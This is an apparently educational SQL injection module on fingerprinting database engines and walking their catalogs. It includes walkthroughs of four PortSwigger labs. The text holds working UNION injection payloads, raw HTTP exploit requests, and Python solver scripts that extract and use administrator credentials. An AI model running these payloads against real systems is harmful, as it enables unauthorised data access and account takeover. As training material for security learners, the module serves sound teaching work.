---
title: Database Fingerprinting
description: Identify the engine, read its version banner, and walk its catalog to find tables and columns.
---

# Database Fingerprinting · Reading Accents & Blueprints

<p class="wd-section-lede">A lockpick is useless if you don't know whether you're facing a tumbler lock, a digital keypad, or a vault combination. In SQL injection, every database engine speaks a distinct dialect: a comment symbol in MySQL breaks Oracle, and Oracle demands a table name (<code>FROM dual</code>) that MySQL finds completely optional. Fingerprinting is the detective art of uncovering the brand, version, and internal blueprint of the database behind the curtain.</p>

<div class="wd-callout">
<p><strong>💡 Everyday Analogy: Identifying the Caller's Accent.</strong> When someone calls you on the telephone, you might not see their face, but their accent and vocabulary immediately tell you where they're from (do they say "soda", "pop", or "coke"?). Once you know who they are, you don't guess their company directory—you simply ask the front desk receptionist for the master building floor-plan. In SQL, that master floor-plan is called the <em>Data Catalog</em>.</p>
</div>

## Case File #2: Interrogating the Database's Identity

Let's trace what happens when you start probing an unknown target behind a store filter:

<div class="wd-case">
  <div class="wd-step wd-step--see">
    <span class="wd-step__tag">🔎 Step 1 · What You Notice in the Browser</span>
    <p>You test the category parameter with a single quote or comment marker. The server responds with an error message, an empty catalog, or a normal page—giving you subtle clues about the syntax rules the database engine obeys.</p>
  </div>

  <div class="wd-step wd-step--server">
    <span class="wd-step__tag">⚙️ Step 2 · What the Server Does Behind the Scenes</span>
    <p>The backend database parser receives your tokens. Different engines handle comments (<code>-- </code> vs <code>#</code>), string concatenation (<code>||</code> vs <code>+</code>), and table-less queries (<code>SELECT 1</code> vs <code>SELECT 1 FROM dual</code>) in completely distinct ways:</p>
    <div class="wd-codesplit">
      <div class="wd-codesplit__legend">
        <span><span class="wd-code-dev">Blue</span> = Application Query</span>
        <span><span class="wd-code-input">Gold</span> = Catalog Extraction Payload</span>
        <span><span class="wd-code-dead">Strikethrough</span> = Discarded Tail</span>
      </div>
      <span class="wd-code-dev">SELECT name, description FROM products WHERE category = '</span><span class="wd-code-input">' UNION SELECT table_name, NULL FROM information_schema.tables--</span><span class="wd-code-dead">' AND released = 1</span>
    </div>
  </div>

  <div class="wd-step wd-step--break">
    <span class="wd-step__tag">💥 Step 3 · Where the Logic Breaks</span>
    <p>Every major database engine ships with a built-in catalog—a set of standard tables that describe the database's own tables and columns (<code>information_schema</code> on PostgreSQL/MySQL/SQL Server, <code>all_tables</code> on Oracle). Because the application's database user has permission to read these metadata views, an attacker can dump the entire schema structure without guessing a single name!</p>
  </div>

  <div class="wd-step wd-step--fix">
    <span class="wd-step__tag">🛡️ Step 4 · How Developers Lock It Down</span>
    <p>Developers use parameterized queries to stop user input from altering commands. In addition, production database accounts are granted <em>least privilege</em>—denying web accounts access to sensitive system catalog views—and custom error pages mask diagnostic error banners.</p>
  </div>
</div>

### Visual Comparison: Guessing vs. Reading the Master Catalog

<div class="wd-compare">
  <div class="wd-compare__card wd-compare__card--expect">
    <span class="wd-compare__title">💭 What the Developer Expected</span>
    <p>The developer thought table and column names like <code>users_x89a</code> and <code>password_h39q</code> were safe because they were generated with random suffixes that nobody could guess from the outside.</p>
  </div>
  <div class="wd-compare__card wd-compare__card--actual">
    <span class="wd-compare__title">💥 What Actually Happened</span>
    <p>The database's own catalog views (<code>information_schema.tables</code> and <code>information_schema.columns</code>) willingly list all randomized table names and column names on command, turning what looked like a secret into an open book.</p>
  </div>
</div>

---

## Three Independent Fingerprinting Channels

Detectives don't expect a neat "MySQL 8.0.36" banner on their first request. We triangulate using three independent channels:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>1. Error Signatures</strong>
    Raw error messages, driver names, or diagnostic error codes (e.g., <code>ORA-00933</code>).
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>2. Dialect Behavior</strong>
    Probing syntax quirks: comment formats, string concatenation, or <code>FROM dual</code> rules.
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>3. Version &amp; Catalog</strong>
    Querying built-in banner functions (<code>@@version</code>, <code>version()</code>) and schema tables.
  </div>
</div>

The third channel is the most precise, but it requires a working injection that returns strings. The first two channels work even when query output is limited or hidden.

### Channel 1: Error Signatures

Trigger a syntax error with a bare single quote (`'`) and read the response carefully:

| Database Engine | Typical Error Signature Fragment |
| --- | --- |
| **PostgreSQL** | `ERROR: syntax error at or near "'"` · `unterminated quoted string` |
| **MySQL / MariaDB** | `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version` |
| **Microsoft SQL Server** | `Unclosed quotation mark after the character string` · `Incorrect syntax near` |
| **Oracle** | `ORA-00933: SQL command not properly ended` · `ORA-01756: quoted string not properly terminated` |
| **SQLite** | `near "...": syntax error` |

> **Detective Caution:** Error text is a helpful clue, not definitive proof. Frameworks may catch exceptions and display generic error templates, or reverse proxies may scrub them. Always confirm with a behavioral probe that only one engine supports.

### Channel 2: Dialect Behavior Probes

When error messages are hidden, probe dialect-specific behaviors:

| Probe | PostgreSQL | MySQL | Oracle | SQL Server |
| --- | --- | --- | --- | --- |
| `SELECT 1` without `FROM` | Works | Works | **Fails** (demands `FROM dual`) | Works |
| `'a' \|\| 'b'` | `'ab'` | `0` or Logical OR | `'ab'` | Bitwise / Error |
| `'a' + 'b'` | Error | `0` (Numeric math) | Error | `'ab'` |
| `--` Line Comment | Yes | Only with trailing space (`-- `) | Yes | Yes |
| `#` Line Comment | No | Yes | No | No |
| `SELECT SLEEP(1)` | No | Yes | No | No |
| `SELECT pg_sleep(1)` | Yes | No | No | No |

A single probe can sometimes be ambiguous. A **combination sequence** locks it down:
- Demands `FROM dual` → **Oracle**
- Accepts `#` comment and `SLEEP(1)` → **MySQL**
- Accepts `pg_sleep(1)` and `||` concatenation → **PostgreSQL**
- Accepts `+` string concatenation and `WAITFOR` → **SQL Server**

::: details 🔬 Under the Hood: Why Error Messages Leak So Much
A database driver raises a structured exception containing an internal code, message, and line position. When developers don't set up custom error handlers, web frameworks print this full exception object onto a debug page.

From the database's perspective, errors are not a security vulnerability; they are helpful diagnostics for developers. The security flaw is that the application **executes user-supplied grammar at all**. Suppressing errors makes investigation harder, but does not fix the underlying vulnerability.
:::

---

## Channel 3: Reading Version Banners

Once you have a string-returning UNION injection, the version banner is just a single query away:

| Database Engine | Version Query | Notes |
| --- | --- | --- |
| **PostgreSQL** | `SELECT version()` | Returns a detailed string: `PostgreSQL 15.6 ...` |
| **MySQL / MariaDB** | `SELECT @@version` | Also `VERSION()`; MariaDB includes `MariaDB` in the banner |
| **Microsoft SQL Server** | `SELECT @@version` | Includes OS build, edition, and patch level |
| **Oracle** | `SELECT banner FROM v$version` | Returns component rows; `BANNER` is the primary row |
| **Oracle (alternate)** | `SELECT version FROM v$instance` | Returns short version string |
| **SQLite** | `SELECT sqlite_version()` | Common in embedded and mobile targets |

To extract these through a `UNION`, match the original query's column count and place the version expression into a string-compatible slot:

```sql
-- MySQL / SQL Server (2 columns, second is filler):
' UNION SELECT @@version, NULL#

-- Oracle (demands a table for every SELECT):
' UNION SELECT banner, NULL FROM v$version--
```

::: details ⚙️ Database Engine Variations: Version Functions and Permissions
- **Oracle `v$version`:** A dynamic performance view. If an account is locked down, try `SELECT * FROM product_component_version`.
- **MySQL `@@version`:** A global system variable. `@@version_comment` reveals the build/edition.
- **SQL Server `@@version`:** A global variable; `SERVERPROPERTY('ProductVersion')` provides structured version numbers.
- **PostgreSQL `version()`:** A built-in function; `current_setting('server_version')` provides a clean version number.
:::

### Fingerprinting When Responses Are Blind

If the application never displays query results on screen, you can still identify the database by testing version characters one bit at a time (foreshadowing [Module 03 · Blind SQLi](/sql-injection/03-blind-sqli)):

```sql
-- PostgreSQL: Is the major version '1'?
' AND SUBSTRING(version(), 1, 1) = '1'--

-- MySQL: Is the major version '8'?
' AND SUBSTRING(@@version, 1, 1) = '8'--

-- Oracle: Is the first letter 'O'?
' AND SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1), 1, 1) = 'O'--
```

Each request answers one bit. This is the bridge to [Module 03 · Blind SQL Injection](/sql-injection/03-blind-sqli); fingerprinting and blind extraction use the exact same oracle machinery.

---

## The Catalog: Where the Database Describes Itself

How do you find table names when nobody tells you they exist? Every major database engine maintains an internal **data dictionary** (or catalog) that lists every table, column, and data type across the entire system.

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>Standard Catalog</strong>
    <code>information_schema</code><br>
    <em>tables, columns, schemata</em>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>PostgreSQL</strong>
    <code>information_schema</code> &amp; <code>pg_catalog</code>
  </div>
  <div class="wd-flow__node">
    <strong>MySQL / MariaDB</strong>
    <code>information_schema</code>
  </div>
  <div class="wd-flow__node">
    <strong>SQL Server</strong>
    <code>information_schema</code> &amp; <code>sys.objects</code>
  </div>
  <div class="wd-flow__node wd-flow__node--danger">
    <strong>Oracle (Unique Catalog)</strong>
    <code>all_tables</code> &amp; <code>all_tab_columns</code> (UPPERCASE!)
  </div>
</div>

### Standard Catalog Queries (PostgreSQL, MySQL, SQL Server)

```sql
-- 1. List all tables across the database:
SELECT table_name FROM information_schema.tables

-- 2. Narrow down to the application's schema:
SELECT table_name FROM information_schema.tables WHERE table_schema = 'public'      -- PostgreSQL
SELECT table_name FROM information_schema.tables WHERE table_schema = database()    -- MySQL
SELECT table_name FROM information_schema.tables WHERE table_catalog = db_name()    -- SQL Server

-- 3. List all columns for a target table:
SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
```

In a UNION payload with 2 columns, pad the query with `NULL` to match arity:

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

### The Oracle Catalog (`ALL_TABLES` & `ALL_TAB_COLUMNS`)

Oracle does not use `information_schema`. Instead, it provides system views named `ALL_TABLES` and `ALL_TAB_COLUMNS`:

```sql
-- 1. List all tables visible to the current database user:
SELECT table_name FROM all_tables

-- 2. List columns for a specific table:
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS_ABCDEF'
```

> [!IMPORTANT]
> **The Oracle Uppercase Trap:** Oracle stores unquoted identifiers in **UPPERCASE**. If you search for `WHERE table_name = 'users'`, Oracle will return zero rows! You **must** query uppercase: `WHERE table_name = 'USERS_ABCDEF'`.

::: details 🔬 Under the Hood: `ALL_TABLES` vs. `USER_TABLES` vs. `DBA_TABLES`
Oracle divides its data dictionary into three tiers:
- **`USER_TABLES`:** Tables owned directly by the logged-in database user.
- **`ALL_TABLES`:** All tables the user has permission to read (including other application schemas). This is usually the best target for SQL injection.
- **`DBA_TABLES`:** Every single table on the server (requires high DBA administrative privileges).
:::

### Alternative Catalog Tables (SQL Server & PostgreSQL)

```sql
-- SQL Server: sys catalog views
SELECT name FROM sys.objects WHERE type = 'U'
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('dbo.users')

-- PostgreSQL: pg_catalog views
SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public'
SELECT column_name FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'users'
```

`information_schema` is the most portable choice, but remember to switch to `all_tables` when targeting Oracle!

---

## The Detective's Repeatable Schema Discovery Loop

Once you have a working UNION injection, following this 4-step loop guarantees you find the data:

<div class="wd-flow">
  <div class="wd-flow__node">
    <strong>1. Identify Dialect</strong>
    Test comments &amp; version banner
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>2. Find Table Name</strong>
    Query <code>tables</code> for <code>users%</code>
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node">
    <strong>3. Find Column Names</strong>
    Query <code>columns</code> for user/pass
  </div>
  <span class="wd-flow__arrow">→</span>
  <div class="wd-flow__node wd-flow__node--safe">
    <strong>4. Extract Rows</strong>
    Extract credentials with <code>UNION</code>
  </div>
</div>

1. **Filter Early:** Catalog views contain thousands of internal rows. Filter immediately with `WHERE table_name LIKE 'users%'` (or `LIKE 'USERS%'` on Oracle) to avoid paging through hundreds of internal database objects.
2. **Respect Case Sensitivity:** Linux MySQL can be case-sensitive for table names; Oracle is uppercase; PostgreSQL folds unquoted names to lowercase. Always copy the exact string returned by the catalog!

::: details ⚙️ Database Engine Variations: Row Limits & Truncation
When the database contains many rows or the web application only renders the first few items:

| Engine | Row Limit Syntax |
| --- | --- |
| **PostgreSQL / MySQL** | `LIMIT 1 OFFSET 0` |
| **SQL Server** | `SELECT TOP 1 ...` or `OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY` |
| **Oracle** | `WHERE ROWNUM = 1` (or `FETCH FIRST 1 ROWS ONLY` on 12c+) |

If long version strings look clipped on screen, extract the text in chunks using `SUBSTRING(@@version, 1, 20)`, `SUBSTRING(@@version, 21, 20)`, etc.
:::

---

## Practice Labs: Database Fingerprinting

The four case files below walk you step-by-step from identifying the server banner to navigating randomized schemas across both standard and Oracle dialect families.

:::: lab

## Lab 1 · Querying the database type and version on Oracle {#lab-querying-database-version-oracle}

**Vulnerability class:** in-band UNION, version disclosure.
**Goal:** display the Oracle version banner.

The category filter is injectable and the result set is rendered. The query returns two text columns.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

<LabCheckbox lab-id="lab-querying-database-version-oracle" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** Oracle requires a `FROM` clause on every `SELECT`. Which built-in table exists solely to satisfy that requirement?

**Level 2 — target parameter and approach.** Use the `category` parameter. Confirm two text columns, then put `BANNER` from `v$version` in the first column and `NULL` in the second. Remember `FROM dual` for the shape check, but `FROM v$version` for the real query.

**Level 3 — exploit skeleton.**

```http
GET /filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v%24version-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET /filter?category=%27+UNION+SELECT+BANNER,+NULL+FROM+v%24version-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
Accept: text/html
Connection: close
```

Decoded payload: `' UNION SELECT BANNER, NULL FROM v$version--`

### The query before and after

```sql
-- before
SELECT name, description FROM products WHERE category = 'Gifts'

-- after
SELECT name, description FROM products WHERE category = ''
UNION SELECT BANNER, NULL FROM v$version--' AND released = 1
```

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `'` | closes the category literal | Code context |
| `UNION SELECT` | append a second result set | Two columns to match |
| `BANNER` | version column in `v$version` | The data you want |
| `,` | column separator | Keeps arity at two |
| `NULL` | second column placeholder | Not rendered; avoids a type mismatch |
| `FROM v$version` | Oracle dynamic performance view | The version source |
| `%24` → `$` | literal dollar sign in the identifier | `v$version` is a view name, not a variable |
| `--` | comment | Removes the original tail |

> **If `v$version` is restricted,** try `SELECT version FROM v$instance` or `SELECT * FROM product_component_version`. The first column of `product_component_version` is `PRODUCT`, not a banner, so adjust the payload.

### Python `requests` solver

```python
import re
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()
    payload = "' UNION SELECT BANNER, NULL FROM v$version--"
    r = s.get(f"{BASE}/filter", params={"category": payload}, timeout=20)

    # Oracle banners contain "Oracle Database" and a version number.
    match = re.search(r"(Oracle Database[^<\n]{0,80})", r.text, re.I)
    if match:
        print(f"[+] Banner leaked: {match.group(1).strip()}")
        print("[+] Lab solved.")
    else:
        print(f"[!] No Oracle banner found (HTTP {r.status_code}).")
        print("    Confirm the column count and try v$instance if v$version is restricted.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

`v$version` is an ordinary queryable view; once the injected `SELECT` has the right shape, the database treats the version metadata exactly like product data.
:::

::::

:::: lab

## Lab 2 · Querying the type and version on MySQL and Microsoft {#lab-querying-database-version-mysql-microsoft}

**Vulnerability class:** in-band UNION, version disclosure.
**Goal:** display the `@@version` string.

The same two-column shape, but the lab runs on MySQL or SQL Server. Both expose `@@version`; the comment syntax differs.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)

<LabCheckbox lab-id="lab-querying-database-version-mysql-microsoft" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** `@@version` is a global variable, not a table. You can select it without a `FROM` clause on both MySQL and SQL Server.

**Level 2 — target parameter and approach.** Use the `category` parameter. Put `@@version` in the first text column and `NULL` in the second. On MySQL, `--` needs a trailing space, so use `#` instead.

**Level 3 — exploit skeleton.**

```http
GET /filter?category=%27+UNION+SELECT+@@version,+NULL%23 HTTP/1.1
Host: <lab-id>.web-security-academy.net
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request

```http
GET /filter?category=%27+UNION+SELECT+@@version,+NULL%23 HTTP/1.1
Host: <lab-id>.web-security-academy.net
Accept: text/html
Connection: close
```

Decoded payload: `' UNION SELECT @@version, NULL#`

### The query before and after

```sql
-- before
SELECT name, description FROM products WHERE category = 'Gifts'

-- after
SELECT name, description FROM products WHERE category = ''
UNION SELECT @@version, NULL#' AND released = 1
```

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `'` | closes the category literal | Code context |
| `UNION SELECT` | append a second result set | Arity must be two |
| `@@version` | MySQL/SQL Server global version variable | No `FROM` needed |
| `,` | column separator | Two columns |
| `NULL` | second column placeholder | Type-safe filler |
| `%23` → `#` | MySQL line comment | No trailing space required |
| `--` alternative | valid on SQL Server; on MySQL needs `-- ` | Dialect-specific |

> **Which engine is it?** The banner tells you. MySQL returns something like `8.0.36-0ubuntu0.22.04.1`; SQL Server returns `Microsoft SQL Server 2022 ...`. Both accept `@@version`, so the extraction works either way.

### Python `requests` solver

```python
import re
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()
    payload = "' UNION SELECT @@version, NULL#"
    r = s.get(f"{BASE}/filter", params={"category": payload}, timeout=20)

    patterns = [
        r"(\d+\.\d+\.\d+[^\s<]*)",                       # MySQL / MariaDB
        r"(Microsoft SQL Server[^<\n]{0,80})",           # SQL Server
        r"(MariaDB[^<\n]{0,40})",
    ]
    for pattern in patterns:
        match = re.search(pattern, r.text, re.I)
        if match:
            print(f"[+] Version leaked: {match.group(1).strip()}")
            print("[+] Lab solved.")
            return

    print(f"[!] No version string found (HTTP {r.status_code}).")
    print("    If the app is MySQL and # is stripped, try a literal '-- ' with a trailing space.")
    sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

Version metadata is stored in the same addressable namespace as user data, so a correctly shaped `UNION` can select it like any other column.
:::

::::

:::: lab

## Lab 3 · Listing database contents on non-Oracle databases {#lab-listing-database-contents-non-oracle}

**Vulnerability class:** in-band UNION, catalog traversal.
**Goal:** find the credential table, discover its column names, extract the rows, and log in as `administrator`.

The lab gives you a login form and an injectable category filter. The table and column names are randomized; guessing will not work.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)

<LabCheckbox lab-id="lab-listing-database-contents-non-oracle" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** You do not need to guess the table name. The database publishes a list of its own tables. What view holds that list?

**Level 2 — target parameter and approach.** The query returns two text columns. Read `table_name` from `information_schema.tables`, find the randomized `users_...` table, then read `column_name` from `information_schema.columns` filtered to that table. Finally, UNION the two randomized credential columns.

**Level 3 — exploit skeleton.**

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request (step 1 — list tables)

```http
GET /filter?category=%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

Look for a table whose name begins `users_`. The suffix is random per instance.

### Step 2 — list its columns

```http
GET /filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_abcdef%27-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

You will see randomized names such as `username_abcdef` and `password_abcdef`.

### Step 3 — extract credentials

```http
GET /filter?category=%27+UNION+SELECT+username_abcdef,password_abcdef+FROM+users_abcdef-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

Log in with the administrator password.

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `information_schema.tables` | standard catalog view of tables | Portable across PostgreSQL, MySQL, SQL Server |
| `table_name` | one row per table | The data you need first |
| `NULL` | second column placeholder | The original query returns two columns |
| `information_schema.columns` | catalog view of columns | Maps columns to tables |
| `WHERE table_name='users_abcdef'` | filter | The catalog contains every table; filter early |
| `username_abcdef`, `password_abcdef` | randomized column names | Copied exactly from step 2 |
| `FROM users_abcdef` | the target table | Case matters on MySQL/Linux |

> **Why the random suffix exists.** It forces you to actually read the catalog instead of hardcoding `users(username,password)`. That is the entire pedagogical point of the lab.

### Python `requests` solver

```python
import re
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance
MARKER = 'class="product-card"'  # not required; we search the whole page

def main() -> None:
    s = requests.Session()

    # 1. Find the randomized users table.
    r = s.get(
        f"{BASE}/filter",
        params={"category": "' UNION SELECT table_name, NULL FROM information_schema.tables--"},
        timeout=20,
    )
    tables = sorted(set(re.findall(r"\b(users_[a-z0-9]+)\b", r.text, re.I)))
    if not tables:
        print("[!] No users_* table found in information_schema.tables.")
        sys.exit(1)
    table = tables[0]
    print(f"[+] table: {table}")

    # 2. Find its randomized username/password columns.
    r = s.get(
        f"{BASE}/filter",
        params={
            "category": (
                "' UNION SELECT column_name, NULL FROM information_schema.columns "
                f"WHERE table_name='{table}'--"
            )
        },
        timeout=20,
    )
    columns = re.findall(r"\b((?:username|password)_[a-z0-9]+)\b", r.text, re.I)
    username_col = next((c for c in columns if c.lower().startswith("username")), None)
    password_col = next((c for c in columns if c.lower().startswith("password")), None)
    if not username_col or not password_col:
        print(f"[!] Could not identify columns. Seen: {columns}")
        sys.exit(1)
    print(f"[+] columns: {username_col}, {password_col}")

    # 3. Extract. CONCAT() works on both MySQL and PostgreSQL.
    payload = (
        f"' UNION SELECT NULL, CONCAT({username_col},'~',{password_col}) "
        f"FROM {table} WHERE {username_col}='administrator'--"
    )
    r = s.get(f"{BASE}/filter", params={"category": payload}, timeout=20)
    pairs = dict(re.findall(r"([A-Za-z0-9_.-]+)~([A-Za-z0-9!@#$%^&*._-]+)", r.text))
    if "administrator" not in pairs:
        print("[!] administrator not found. Response may be truncated.")
        sys.exit(1)

    password = pairs["administrator"]
    print(f"[+] administrator password: {password}")

    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[!] Login failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

`information_schema` is a set of views over the database's own metadata, and the application's query permissions apply to it just like any user table.
:::

::::

:::: lab

## Lab 4 · Listing database contents on Oracle {#lab-listing-database-contents-oracle}

**Vulnerability class:** in-band UNION, Oracle catalog traversal.
**Goal:** find the randomized credential table and columns in Oracle's data dictionary, then log in as `administrator`.

Oracle does not use `information_schema`. Its catalog lives in `ALL_TABLES` and `ALL_TAB_COLUMNS`, and unquoted identifiers are uppercase.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

<LabCheckbox lab-id="lab-listing-database-contents-oracle" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** Oracle publishes tables in `ALL_TABLES` and columns in `ALL_TAB_COLUMNS`. Every `SELECT` still needs a `FROM`, even when you are selecting a literal.

**Level 2 — target parameter and approach.** The query returns two text columns. Read `table_name` from `all_tables`, find the uppercase `USERS_...` table, then read `column_name` from `all_tab_columns` filtered by that exact table name. Oracle stores names in uppercase, so copy them exactly.

**Level 3 — exploit skeleton.**

```sql
' UNION SELECT table_name, NULL FROM all_tables--
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
' UNION SELECT USERNAME_ABCDEF, PASSWORD_ABCDEF FROM USERS_ABCDEF--
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request (step 1 — list tables)

```http
GET /filter?category=%27+UNION+SELECT+table_name,+NULL+FROM+all_tables-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

Look for an uppercase table beginning `USERS_`. Oracle's dictionary is large; filtering with `WHERE table_name LIKE 'USERS%'` is also valid.

### Step 2 — list its columns

```http
GET /filter?category=%27+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_ABCDEF%27-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

### Step 3 — extract credentials

```http
GET /filter?category=%27+UNION+SELECT+USERNAME_ABCDEF,PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- HTTP/1.1
Host: <lab-id>.web-security-academy.net
```

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `all_tables` | Oracle view of accessible tables | Oracle's catalog interface |
| `all_tab_columns` | Oracle view of accessible columns | Column metadata |
| `table_name` / `column_name` | catalog column names | Uppercase metadata identifiers |
| `WHERE table_name='USERS_ABCDEF'` | exact uppercase match | Oracle folds unquoted identifiers to uppercase |
| `USERNAME_ABCDEF`, `PASSWORD_ABCDEF` | randomized data columns | Copy exactly from step 2 |
| `FROM USERS_ABCDEF` | target table | Case-sensitive string comparison |
| `--` | comment | Removes the original query tail |
| `NULL` | arity filler | The original query returns two columns |

> **If step 1 returns nothing,** switch from `all_tables` to `user_tables`. If step 2 returns nothing, check the case of the table name and make sure you copied the suffix exactly. Oracle will not forgive lowercase.

### Python `requests` solver

```python
import re
import sys
import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance

def main() -> None:
    s = requests.Session()

    # 1. Find the randomized USERS_* table (Oracle returns uppercase).
    r = s.get(
        f"{BASE}/filter",
        params={"category": "' UNION SELECT table_name, NULL FROM all_tables--"},
        timeout=20,
    )
    tables = sorted(set(re.findall(r"\b(USERS_[A-Z0-9]+)\b", r.text)))
    if not tables:
        print("[!] No USERS_* table found. Try user_tables if all_tables is restricted.")
        sys.exit(1)
    table = tables[0]
    print(f"[+] table: {table}")

    # 2. Find its columns.
    r = s.get(
        f"{BASE}/filter",
        params={
            "category": (
                "' UNION SELECT column_name, NULL FROM all_tab_columns "
                f"WHERE table_name='{table}'--"
            )
        },
        timeout=20,
    )
    columns = re.findall(r"\b((?:USERNAME|PASSWORD)_[A-Z0-9]+)\b", r.text)
    username_col = next((c for c in columns if c.startswith("USERNAME")), None)
    password_col = next((c for c in columns if c.startswith("PASSWORD")), None)
    if not username_col or not password_col:
        print(f"[!] Could not identify columns. Seen: {columns}")
        sys.exit(1)
    print(f"[+] columns: {username_col}, {password_col}")

    # 3. Extract with Oracle || concatenation into one column.
    payload = (
        f"' UNION SELECT NULL, {username_col} || '~' || {password_col} "
        f"FROM {table} WHERE {username_col}='administrator'--"
    )
    r = s.get(f"{BASE}/filter", params={"category": payload}, timeout=20)
    pairs = dict(re.findall(r"([A-Za-z0-9_.-]+)~([A-Za-z0-9!@#$%^&*._-]+)", r.text))
    if "administrator" not in pairs:
        print("[!] administrator not found. Check column case and output truncation.")
        sys.exit(1)

    password = pairs["administrator"]
    print(f"[+] administrator password: {password}")

    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[!] Login failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

Oracle's data dictionary is queryable through ordinary views, and `ALL_TAB_COLUMNS` gives you the exact randomized identifier strings needed to build the final `SELECT`.
:::

::::

<TopicComplete topic-id="sql-injection/database-fingerprinting" label="Mark the fingerprinting module complete" />

---

## Before you move on

- Can you name the version query for all four major engines?
- Why does `SELECT 1` fail on Oracle, and what fixes it?
- Why does `WHERE table_name = 'users'` return nothing on Oracle?
- Which catalog view would you use on MySQL to avoid listing every schema on the server?
- If the version banner is truncated in the page, how do you extract it in pieces?

Next: [Module 03 · Blind SQL Injection](/sql-injection/03-blind-sqli) — where the response stops showing you rows, and every bit has to be inferred.
